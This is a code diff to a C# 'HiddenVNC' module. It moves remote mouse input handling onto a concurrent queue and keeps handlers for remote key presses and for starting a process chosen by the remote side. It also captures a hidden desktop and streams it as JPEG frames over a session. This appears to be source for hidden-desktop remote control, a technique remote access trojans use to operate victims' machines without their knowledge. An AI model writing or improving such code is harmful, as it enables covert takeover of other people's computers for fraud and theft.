@@ -39,8 +39,8 @@ namespace HiddenVNC
 
         private void HandlePacket(object? sender, EventArgs e)
         {
-            var dto = (HVNCDTO)sender;
 
+            var dto = (HVNCDTO)sender;
             if (dto.Char != null)
             {
                 HandleKeyInput(new KeyInput
@@ -48,42 +48,75 @@ namespace HiddenVNC
                     isKeyPressed = dto.IsPressed,
                     key = dto.Char,
                 });
+
+                return;
             }
-            else if (dto.process != null)
+
+            if (dto.process != null)
             {
                 StartProcess(dto.process);
+                return;
             }
-            else if (dto.MouseButton != 0)
+
+            MouseInput mi;
+            if (dto.MouseButton != 0)
             {
-                HandleMouseInput(new MouseInput
+                mi = new MouseInput
                 {
                     button = (MouseButton)dto.MouseButton,
-                    scrollDelta= dto.scrollDelta,
+                    scrollDelta = null,
                     state = (MouseButtonState)(Convert.ToInt32(!dto.IsPressed)),
                     xFactor = dto.xFactor,
                     yFactor = dto.yFactor,
-                });
-            }else if (dto.scrollDelta != 0)
+                };
+            }
+            else if (dto.scrollDelta != 0)
             {
-                HandleMouseInput(new MouseInput
+                mi = new MouseInput
                 {
-                    scrollDelta=dto.scrollDelta,
+                    state = null,
+                    button = null,
+                    scrollDelta = dto.scrollDelta,
                     xFactor = dto.xFactor,
                     yFactor = dto.yFactor,
-                });
+                };
             }
             else
             {
 
-                HandleMouseInput(new MouseInput
+                mi = new MouseInput
                 {
+                    state = null,
+                    scrollDelta = null,
+                    button = null,
                     xFactor = dto.xFactor,
                     yFactor = dto.yFactor,
+                };
+            }
+
+            inputQueue.Enqueue(mi);
+            if (handleInputTask.IsCompleted)
+            {
+                handleInputTask = Task.Run(() =>
+                {
+                    HandleInput();
                 });
             }
         }
 
+        private void HandleInput()
+        {
+            while (inputQueue.Count > 0)
+            {
+                if (inputQueue.TryDequeue(out MouseInput mi))
+                {
+                    HandleMouseInput(mi);
+                }
+            }
+        }
 
+        ConcurrentQueue<MouseInput> inputQueue = new();
+        private Task handleInputTask = Task.CompletedTask;
 
         private static ImageCodecInfo GetEncoder(ImageFormat format)
         {
@@ -156,7 +189,7 @@ namespace HiddenVNC
 
         public enum MouseButton
         {
-            Right =1,
+            Right = 1,
 
             Left,
 
@@ -542,7 +575,7 @@ namespace HiddenVNC
                 {
                     Bitmap bmp = await CaptureHidden();
                     bmp.Save(ms, _jpegEncoder, _encoderParameter);
-                   
+
                     await _session.SendPacketAsync(new HVNCDTO()
                     {
                         Frame = ms.ToArray()
